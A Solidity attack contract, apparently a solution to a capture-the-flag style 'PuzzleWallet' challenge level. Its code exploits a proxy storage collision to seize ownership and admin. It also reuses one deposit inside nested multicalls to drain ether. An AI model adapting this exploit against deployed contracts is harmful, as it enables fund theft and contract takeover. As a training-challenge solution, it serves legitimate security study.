// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/PuzzleWallet.sol";

contract PuzzleWalletAttack{
    bytes[]  data;
    function att(address payable addr) public {
        PuzzleProxy(addr).proposeNewAdmin(address(this));
    }
    function att1(address payable addr) public payable {
        PuzzleProxy(addr).proposeNewAdmin(address(this));
        PuzzleWallet(addr).addToWhitelist(address(this));
        bytes memory data1 = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        data.push(data1);
        bytes memory data2 = abi.encodeWithSelector(PuzzleWallet.multicall.selector,data);
        data.push(data2);
        PuzzleWallet(addr).multicall{value : 0.001 ether}(data);
        PuzzleWallet(addr).execute(address(this), 0.002 ether,"");
        PuzzleWallet(addr).setMaxBalance(uint256(uint160(address(this))));
    }
    receive() external payable { }
}